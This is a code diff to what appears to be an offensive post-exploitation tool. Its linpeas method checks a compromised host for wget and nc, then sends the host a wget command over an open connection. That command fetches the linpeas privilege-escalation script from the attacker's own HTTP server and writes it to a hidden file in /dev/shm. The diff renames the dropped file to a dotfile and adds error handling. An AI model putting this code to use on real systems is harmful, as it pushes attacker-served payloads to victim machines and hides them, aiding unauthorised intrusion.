@@ -47,7 +47,6 @@ class Rhost:
 
     def linpeas(conn):
         bufferSize = 2**12
-        print(conn)
         l = ["wget","nc"]
         for cmd in l:
             command = "which " + cmd
@@ -66,16 +65,18 @@ class Rhost:
                         time.sleep(2)
                         name = socket.gethostname()
                         ip = socket.gethostbyname(name)
-                        command = "wget http://%s:8000/linpeas.sh -O /dev/shm/linpeas.sh"%(ip)
+                        command = "wget http://%s:8000/linpeas.sh -O /dev/shm/.linpeas.sh"%(ip)
                         conn.send(command.encode())
                         while True:
                             response = conn.recv(bufferSize).decode()
                             print(response)
                             if len(response) < bufferSize:
                                 os.kill(pid, signal.SIGTERM)
-                            break
+                                break
+                    except FileNotFoundError:
+                        print("There is no linpeas in /opt/peass ! Please put it in this folder ('/opt/peass')")
                     except:
-                        print("Error !")
+                        print("Error")
                     break
                 elif "nc" in cmd:
                     print("not ready")
@@ -134,6 +135,3 @@ class Rhost:
                 print("Error !")
         except:
             print("Can't open this file or this file doesn't exist !")
-        #try:
-        #except:
-        #    print("Error !")
